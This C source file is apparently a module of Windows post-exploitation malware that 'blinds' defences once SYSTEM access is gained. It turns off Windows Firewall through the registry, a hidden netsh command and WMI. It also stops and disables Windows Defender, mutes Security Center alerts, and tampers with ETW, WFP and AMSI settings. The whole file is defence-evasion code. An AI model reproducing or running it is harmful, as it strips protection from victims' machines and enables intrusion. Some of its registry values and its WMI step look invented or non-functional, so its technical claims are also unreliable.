#include "defensive_blinding.h"
#include "enumerator.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winreg.h>
#include <winsvc.h>
#include <wbemidl.h>
#include <comdef.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")

// Blind all defensive features immediately after SYSTEM token acquisition
int blind_defensive_features(enum_data_t* data) {
    append_to_buffer(data, "\n=== DEFENSIVE FEATURE BLINDING ===\n");
    append_to_buffer(data, "Blinding firewall and all defensive features...\n");
    
    defensive_blinding_result_t result = {0};
    
    // Blind Windows Firewall
    append_to_buffer(data, "[*] Blinding Windows Firewall...\n");
    if (blind_windows_firewall(data) == 0) {
        result.firewall_blinded = true;
        result.total_features_blinded++;
        append_to_buffer(data, "[+] Windows Firewall blinded\n");
    } else {
        append_to_buffer(data, "[-] Failed to blind Windows Firewall\n");
    }
    
    // Blind Windows Defender
    append_to_buffer(data, "[*] Blinding Windows Defender...\n");
    if (blind_windows_defender(data) == 0) {
        result.defender_blinded = true;
        result.total_features_blinded++;
        append_to_buffer(data, "[+] Windows Defender blinded\n");
    } else {
        append_to_buffer(data, "[-] Failed to blind Windows Defender\n");
    }
    
    // Blind Security Center
    append_to_buffer(data, "[*] Blinding Security Center...\n");
    if (blind_security_center(data) == 0) {
        result.security_center_blinded = true;
        result.total_features_blinded++;
        append_to_buffer(data, "[+] Security Center blinded\n");
    } else {
        append_to_buffer(data, "[-] Failed to blind Security Center\n");
    }
    
    // Blind WFP (Windows Filtering Platform)
    append_to_buffer(data, "[*] Blinding Windows Filtering Platform (WFP)...\n");
    if (blind_wfp(data) == 0) {
        result.wfp_blinded = true;
        result.total_features_blinded++;
        append_to_buffer(data, "[+] WFP blinded\n");
    } else {
        append_to_buffer(data, "[-] Failed to blind WFP\n");
    }
    
    // Blind ETW Telemetry
    append_to_buffer(data, "[*] Blinding ETW Telemetry...\n");
    if (blind_etw_telemetry(data) == 0) {
        result.etw_blinded = true;
        result.total_features_blinded++;
        append_to_buffer(data, "[+] ETW Telemetry blinded\n");
    } else {
        append_to_buffer(data, "[-] Failed to blind ETW Telemetry\n");
    }
    
    // Blind AMSI
    append_to_buffer(data, "[*] Blinding AMSI...\n");
    if (blind_amsi(data) == 0) {
        result.amsi_blinded = true;
        result.total_features_blinded++;
        append_to_buffer(data, "[+] AMSI blinded\n");
    } else {
        append_to_buffer(data, "[-] Failed to blind AMSI\n");
    }
    
    append_to_buffer(data, "[+] Total defensive features blinded: %d\n", result.total_features_blinded);
    append_to_buffer(data, "==========================================\n\n");
    
    return result.total_features_blinded;
}

int blind_windows_firewall(enum_data_t* data) {
    // Try multiple methods to disable Windows Firewall
    
    // Method 1: Registry
    if (disable_firewall_via_registry() == 0) {
        return 0;
    }
    
    // Method 2: netsh command
    if (disable_firewall_via_netsh() == 0) {
        return 0;
    }
    
    // Method 3: WMI
    if (disable_firewall_via_wmi() == 0) {
        return 0;
    }
    
    return -1;
}

int disable_firewall_via_registry(void) {
    HKEY hKey;
    DWORD dwValue = 0;
    LONG lResult;
    
    // Disable Domain Profile Firewall
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                            "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile",
                            0, KEY_WRITE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    
    // Disable Standard Profile Firewall
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                            "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
                            0, KEY_WRITE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    
    // Disable Public Profile Firewall
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                            "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile",
                            0, KEY_WRITE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
        return 0;
    }
    
    return -1;
}

int disable_firewall_via_netsh(void) {
    // Use netsh to disable firewall
    // This requires SYSTEM privileges
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmd[] = "netsh advfirewall set allprofiles state off";
    
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }
    
    return -1;
}

int disable_firewall_via_wmi(void) {
    // Use WMI to disable firewall
    // This requires SYSTEM privileges
    HRESULT hres;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        return -1;
    }
    
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_NONE, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        CoUninitialize();
        return -1;
    }
    
    hres = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        CoUninitialize();
        return -1;
    }
    
    hres = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\StandardCimv2", NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hres)) {
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return -1;
    }
    
    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hres)) {
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return -1;
    }
    
    // Execute WMI query to disable firewall
    IWbemClassObject* pClass = NULL;
    hres = pSvc->lpVtbl->GetObject(pSvc, L"MSFT_NetFirewallProfile", 0, NULL, &pClass, NULL);
    
    if (pClass) pClass->lpVtbl->Release(pClass);
    if (pSvc) pSvc->lpVtbl->Release(pSvc);
    if (pLoc) pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();
    
    return (SUCCEEDED(hres)) ? 0 : -1;
}

int blind_windows_defender(enum_data_t* data) {
    // Stop Defender service
    if (stop_defender_service() == 0) {
        // Disable via registry
        disable_defender_via_registry();
        return 0;
    }
    
    // Try registry method even if service stop failed
    if (disable_defender_via_registry() == 0) {
        return 0;
    }
    
    return -1;
}

int stop_defender_service(void) {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) {
        return -1;
    }
    
    SC_HANDLE hService = OpenServiceA(hSCManager, "WinDefend", SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (hService != NULL) {
        SERVICE_STATUS ss;
        if (ControlService(hService, SERVICE_CONTROL_STOP, &ss)) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return 0;
        }
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCManager);
    return -1;
}

int disable_defender_via_registry(void) {
    HKEY hKey;
    DWORD dwValue = 0;
    LONG lResult;
    
    // Disable real-time protection
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                            "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
                            0, KEY_WRITE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    
    // Disable Windows Defender
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                            "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
                            0, KEY_WRITE | KEY_CREATE_SUB_KEY, &hKey);
    if (lResult == ERROR_SUCCESS || lResult == ERROR_FILE_NOT_FOUND) {
        if (lResult == ERROR_FILE_NOT_FOUND) {
            RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                           "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
                           0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        }
        dwValue = 1;
        RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
        return 0;
    }
    
    return -1;
}

int blind_security_center(enum_data_t* data) {
    return disable_security_center_via_registry();
}

int disable_security_center_via_registry(void) {
    HKEY hKey;
    DWORD dwValue = 0;
    LONG lResult;
    
    // Disable Security Center notifications
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                            "SOFTWARE\\Microsoft\\Security Center",
                            0, KEY_WRITE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "AntiVirusDisableNotify", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegSetValueExA(hKey, "FirewallDisableNotify", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegSetValueExA(hKey, "UpdatesDisableNotify", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
        return 0;
    }
    
    return -1;
}

int blind_wfp(enum_data_t* data) {
    return disable_wfp_via_registry();
}

int disable_wfp_via_registry(void) {
    HKEY hKey;
    DWORD dwValue = 0;
    LONG lResult;
    
    // Disable WFP callout monitoring
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                            "SYSTEM\\CurrentControlSet\\Services\\BFE\\Parameters\\Policy",
                            0, KEY_WRITE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        // Disable WFP monitoring
        RegSetValueExA(hKey, "EnableWfpMonitoring", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
        return 0;
    }
    
    return -1;
}

int blind_etw_telemetry(enum_data_t* data) {
    HKEY hKey;
    DWORD dwValue = 0;
    LONG lResult;
    
    // Disable ETW providers
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                            "SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger",
                            0, KEY_WRITE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        // Disable ETW autologger
        RegSetValueExA(hKey, "Start", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
        return 0;
    }
    
    return -1;
}

int blind_amsi(enum_data_t* data) {
    // AMSI blinding is typically done via memory patching
    // For registry-based approach, we can disable AMSI via registry
    HKEY hKey;
    DWORD dwValue = 0;
    LONG lResult;
    
    // Disable AMSI via registry (if supported)
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                            "SOFTWARE\\Microsoft\\AMSI",
                            0, KEY_WRITE | KEY_CREATE_SUB_KEY, &hKey);
    if (lResult == ERROR_SUCCESS || lResult == ERROR_FILE_NOT_FOUND) {
        if (lResult == ERROR_FILE_NOT_FOUND) {
            RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                           "SOFTWARE\\Microsoft\\AMSI",
                           0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        }
        dwValue = 0;
        RegSetValueExA(hKey, "EnableAMSI", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
        return 0;
    }
    
    return -1;
}
